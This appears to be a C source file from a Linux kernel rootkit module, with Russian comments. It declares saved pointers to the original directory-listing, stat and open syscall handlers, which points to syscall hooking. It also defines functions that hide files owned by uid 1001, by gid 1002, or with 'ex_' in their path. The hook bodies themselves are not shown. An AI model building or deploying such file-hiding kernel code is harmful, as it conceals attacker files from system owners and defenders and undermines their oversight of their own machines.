#include "files.h"

bool (*real_filldir64)(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type) = NULL;
bool (*real_filldir)(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type) = NULL;

asmlinkage long (*real_sys_stat)(struct pt_regs *regs) = NULL;
asmlinkage long (*real_sys_lstat)(struct pt_regs *regs) = NULL;
asmlinkage long (*real_sys_newstat)(struct pt_regs *regs) = NULL;
asmlinkage long (*real_sys_newlstat)(struct pt_regs *regs) = NULL;
asmlinkage long (*real_sys_newfstatat)(struct pt_regs *regs) = NULL;
asmlinkage long (*real_sys_statx)(struct pt_regs *regs) = NULL;

asmlinkage long (*real_sys_open)(struct pt_regs *regs) = NULL;
asmlinkage long (*real_sys_openat)(struct pt_regs *regs) = NULL;
asmlinkage long (*real_sys_openat2)(struct pt_regs *regs) = NULL;

struct Extended_array {
    void *array_addr;
    int array_size;
};

unsigned int uids[] = {1001};
unsigned int gids[] = {1002};
struct Extended_array ea_uids = {uids, sizeof(uids) / sizeof(uids[0])};
struct Extended_array ea_gids = {gids, sizeof(gids) / sizeof(gids[0])};
/*
    copy_file_stat - функция, копирует путь файла в пространство ядра

    char *filepath   - указатель на пространство пользователя
    char **kfilepath - указатель на указатель на пространство ядра
*/
bool copy_filepath(char *filepath, char **kfilepath) {
    size_t filepath_len = strnlen_user(filepath, PATH_MAX);
    if (filepath_len == 0 || filepath_len > PATH_MAX) { 
        return false;
    }

    *kfilepath = kzalloc(filepath_len, GFP_KERNEL);
    if (*kfilepath == NULL) {
        return false;
    }

    if (copy_from_user(*kfilepath, filepath, filepath_len)) {
        return false;
    }

    (*kfilepath)[filepath_len - 1] = '\0'; 

    return true;
}

/*
    is_hide_uid - функция, скрыть или нет файл по uid

    unsigned int file_uid - uid файла
*/
bool is_hide_uid(unsigned int file_uid) {
    for (int uid_id = 0; uid_id < ea_uids.array_size; uid_id++) {
        if (file_uid == ((unsigned int*)ea_uids.array_addr)[uid_id]) {
            return true;
        }    
    }

    return false;
}

/*
    is_hide_gid - функция, скрыть или нет файл по gid

    unsigned int file_gid - gid файла
*/
bool is_hide_gid(unsigned int file_gid) {
    for (int gid_id = 0; gid_id < ea_gids.array_size; gid_id++) {
        if (file_gid == ((unsigned int*)ea_gids.array_addr)[gid_id]) {
            return true;
        }    
    }

    return false;
}

/*
    is_hide_file - функция, скрыть или нет файл по uid, gid, подстроке названия файла

    unsigned int file_uid - uid файла
    unsigned int file_gid - gid файла
    char *kfilepath       - путь до файла файла 
*/
bool is_hide_file(unsigned int file_uid, unsigned int file_gid, char *kfilepath) {
    if (is_hide_uid(file_uid) || is_hide_gid(file_gid) || strstr(kfilepath, "ex_")) {
        return true;
    }

    return false;
}